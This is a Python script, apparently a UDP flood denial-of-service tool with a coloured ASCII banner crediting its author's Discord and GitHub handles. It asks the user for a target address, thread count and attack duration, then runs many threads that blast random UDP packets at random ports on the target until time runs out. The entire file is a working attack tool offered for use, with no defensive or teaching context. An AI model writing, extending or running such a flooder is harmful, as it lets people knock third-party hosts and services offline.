import socket
import random
import threading
import time

from os import system

system("title ")
system("mode 70, 20")

def gui():
    print(
'''
\x1b[31m╔═════════════════════════════════════════════════╗
                           _______  _           
        |\     /||\     /|(  ____ )( \          
        | )   ( || )   ( || (    )|| (          
        | (___) || |   | || (____)|| |          
        |  ___  || |   | ||     __)| |          
        | (   ) || |   | || (\ (   | |          
        | )   ( || (___) || ) \ \__| (____/\\   
        |/     \|(_______)|/   \__/(_______/    
       \x1b[38;5;56m[Discord] \x1b[31mhurl#8400 \x1b[38;5;56m[Github] \x1b[31mhvrrl                                    
\x1b[31m╚═════════════════════════════════════════════════╝
''')

def start():
     try:
          target = str(input("ENTER YOUR TARGET: "))
          threads = int(input("ENTER THREADS: "))
          TIME = float(input("ENTER ATTACK DURATION: "))
          timeout = time.time() + 1*TIME
     except:
          print("Invalid Input")
          return 0
     finally:
          return (target, threads, TIME, timeout)
    
def attack(timeout, target):
    try:
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20,55500)
            sock.sendto(bytes*random.randint(5,15), (target, dport))
        return
    except:
        pass
    
def main():
    while True:
          gui()
          target, threads, TIME, timeout = start()
          for x in range(0, threads):
               t1 = threading.Thread(target=attack, args=(timeout, target))
               t1.start()
          time.sleep(TIME)
          system("cls")

if __name__ == '__main__':
    main()
